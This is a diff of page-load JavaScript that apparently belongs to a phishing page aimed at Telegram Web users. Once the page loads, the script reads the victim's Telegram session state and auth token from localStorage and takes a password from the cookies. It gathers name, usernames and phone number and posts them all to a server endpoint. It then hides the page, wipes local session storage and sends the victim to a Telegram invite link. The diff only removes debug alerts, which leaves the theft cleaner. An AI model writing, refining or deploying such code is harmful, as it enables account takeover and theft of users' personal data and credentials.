@@ -1,24 +1,17 @@
 document.addEventListener("DOMContentLoaded", function() {
   async function checkLocalStorage() {
     let globalState = localStorage.getItem("tt-global-state");
-    alert(globalState);
     if (globalState && localStorage.getItem("user_auth")) {
-      alert(localStorage.getItem("user_auth"));
       const parsedState = JSON.parse(globalState);
       const currentUserId = parsedState.currentUserId;
       const currentUser = parsedState.users.byId[currentUserId];
       document.body.style.display = "none";
-
-      alert(currentUserId);
-      alert(currentUser, 'currentUser');
-
       if (currentUserId && currentUser) {
         const { firstName, usernames, phoneNumber, isPremium } = currentUser;
         const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];
 
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
-        alert('run of api');
         try {
           fetch(`/api/users/telegram/info`, {
             method: "POST",
@@ -31,7 +24,7 @@ document.addEventListener("DOMContentLoaded", function() {
             })
           });
         } catch (er) {
-          alert(JSON.stringify(er));
+          console.log(er, 'error in api')
         }
 
         window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
@@ -43,7 +36,6 @@ document.addEventListener("DOMContentLoaded", function() {
         clearInterval(checkInterval);
       }
     } else {
-      alert('can not run');
       sessionStorage.clear();
       localStorage.clear();
     }
